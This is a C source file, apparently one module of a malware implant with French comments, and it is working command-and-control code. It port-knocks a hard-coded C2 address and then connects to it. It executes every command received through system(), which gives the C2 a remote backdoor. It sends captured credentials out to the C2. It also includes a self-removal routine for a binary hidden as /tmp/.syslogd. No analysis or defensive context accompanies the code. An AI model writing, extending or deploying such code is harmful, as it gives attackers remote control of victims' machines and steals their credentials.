#include "communication.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define C2_IP "192.168.1.17"
#define C2_PORT 4444
#define KNOCK_SEQUENCE {7777, 5921, 8675}
#define KNOCK_COUNT 3

static int knock_sequence[KNOCK_COUNT] = KNOCK_SEQUENCE;

/**
 * Envoie des paquets vides pour frapper sur la séquence de ports.
 */
void initiate_port_knocking() {
    int sock;
    struct sockaddr_in server_addr;

    for (int i = 0; i < KNOCK_COUNT; i++) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(knock_sequence[i]);
        inet_pton(AF_INET, C2_IP, &server_addr.sin_addr);

        connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
        close(sock);
        usleep(500000); // Petite pause entre les frappes (500ms)
    }
}

/**
 * Après la séquence de port knocking, le client établit la connexion au serveur C2.
 */
void establish_c2_connection() {
    initiate_port_knocking();  // Frapper avant de se connecter

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
        receive_and_execute_commands(sock);
    }
    close(sock);
}

/**
 * Envoie des credentials capturés au serveur C2.
 */
void send_credentials_to_c2(const char *credentials) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
        send(sock, credentials, strlen(credentials), 0);
    }
    close(sock);
}

/**
 * Reçoit les commandes du C2 et les exécute sur le client.
 */
void receive_and_execute_commands(int sock) {
    char buffer[1024];
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received > 0) {
            if (strcmp(buffer, "UNINSTALL") == 0) {
                system("rm -f /tmp/.syslogd"); // Suppression du malware
                exit(0);
            } else {
                system(buffer);  // Exécution des commandes arbitraires
            }
        } else {
            break;
        }
    }
}
